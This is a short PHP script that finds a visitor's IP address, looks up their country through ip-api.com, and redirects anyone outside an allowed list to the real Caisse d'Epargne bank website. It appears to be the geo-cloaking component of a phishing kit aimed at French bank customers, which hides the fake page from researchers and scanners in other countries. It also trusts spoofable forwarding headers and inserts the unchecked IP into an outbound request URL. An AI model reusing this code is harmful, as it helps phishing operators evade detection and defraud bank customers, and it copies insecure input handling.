<?php
$ip = "";
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

function countryAllow($countryCode,$ip){
	$ipInfo = @json_decode(file_get_contents("http://ip-api.com/json/$ip"));
	$ipCode = strtolower($ipInfo->countryCode);
	$sus = strtolower($countryCode);
if($sus  == $ipCode){
	return true;
}
return false;
}

$allowed = false;
foreach($allowedCountries as $countryCode){
if(countryAllow($countryCode,$ip)){
$allowed = true;
}	
}

if(!$allowed){
	header('Location: https://www.caisse-epargne.fr/');
}
?>